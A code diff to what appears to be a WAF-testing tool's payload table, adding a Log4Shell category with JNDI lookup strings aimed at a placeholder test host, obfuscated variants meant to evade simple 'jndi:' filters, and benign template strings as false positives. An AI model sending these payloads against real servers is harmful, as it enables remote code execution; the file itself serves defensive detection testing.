@@ -677,6 +677,34 @@ export const BASE_PAYLOADS: Record<string, PayloadCategory> = {
 			'invoice-2024',
 		],
 	},
+	'Log4Shell (JNDI)': {
+		type: 'ParamCheck',
+		payloads: [
+			'${jndi:ldap://waftest.example.com/a}',
+			'${jndi:rmi://waftest.example.com/a}',
+			'${jndi:dns://waftest.example.com/a}',
+			'${jndi:ldaps://waftest.example.com/a}',
+			'${jndi:iiop://waftest.example.com/a}',
+			// Lookup-based obfuscation used to evade naive "jndi:" string filters
+			'${${lower:jndi}:${lower:ldap}://waftest.example.com/a}',
+			'${${upper:j}ndi:${upper:l}dap://waftest.example.com/a}',
+			'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://waftest.example.com/a}',
+			'${jndi:${lower:l}${lower:d}a${lower:p}://waftest.example.com/a}',
+			'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://waftest.example.com/a}',
+		],
+		falsePayloads: [
+			'${user.name}',
+			'Welcome ${username}',
+			'${HOME}/logs',
+			'config=${APP_ENV}',
+			'Total: ${amount}',
+			'path/to/${dir}',
+			'{{handlebars}}',
+			'#{springEL}',
+			'email template ${firstName}',
+			'2 + 2 = ${result}',
+		],
+	},
 };
 
 export const PAYLOADS: Record<string, PayloadCategory> = {
